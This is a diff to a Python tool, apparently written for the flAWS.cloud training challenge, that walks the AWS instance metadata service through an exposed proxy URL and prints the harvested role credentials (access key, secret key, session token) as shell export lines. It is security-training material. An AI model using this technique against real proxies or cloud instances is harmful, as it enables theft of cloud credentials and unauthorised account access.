@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 """
 Tool to scan the IMDS of AWS via a proxy URL on EC2.
 Used for the http://flAWS.cloud challenge.
@@ -55,7 +56,7 @@ class Mem:
 
 
 class IMDS:
-    """IMDS scanner"""
+    """IMDS spider"""
 
     def __init__(self, proxy_url=''):
         """init"""
@@ -128,8 +129,8 @@ class IMDS:
         return
 
 
-parser = argparse.ArgumentParser('Scan IMDS')
-parser.add_argument("-p", "--proxy", help="base url for IMDS")
+parser = argparse.ArgumentParser('IMDS Spider')
+parser.add_argument("-p", "--proxy", help="base url for IMDS, use http:// for local")
 parser.add_argument("-o", "--output", help="write json to the file")
 parser.add_argument("-ii", "--instance-identity", help="only instance-identity", action="store_true")
 parser.add_argument("-c", "--creds", help="print env script with creds", action="store_true")
@@ -137,7 +138,8 @@ parser.add_argument("-c", "--creds", help="print env script with creds", action=
 args = parser.parse_args()
 
 # override args while running in an IDE
-args.proxy = 'http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy'
+if args.proxy == None:
+    args.proxy = 'http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy'
 # args.output = 'imds.json'
 # args.instance_identity = True
 # args.creds = True
@@ -175,11 +177,11 @@ elif args.creds:
     # print(f'export AWS_SECRET_ACCESS_KEY={id1["SecretAccessKey"]}')
     # print(f'export AWS_SESSION_TOKEN={id1["Token"]}')
     #
-    print('# profile flaws')
+    print(f'# or use: aws configure with --profile {role}')
     print(f'export AWS_ACCESS_KEY_ID={id2["AccessKeyId"]}')
     print(f'export AWS_SECRET_ACCESS_KEY={id2["SecretAccessKey"]}')
     print(f'export AWS_SESSION_TOKEN={id2["Token"]}')
-
+    print('# apply these, then call: aws sts get-caller-identity')
     exit(1)
 
 else:
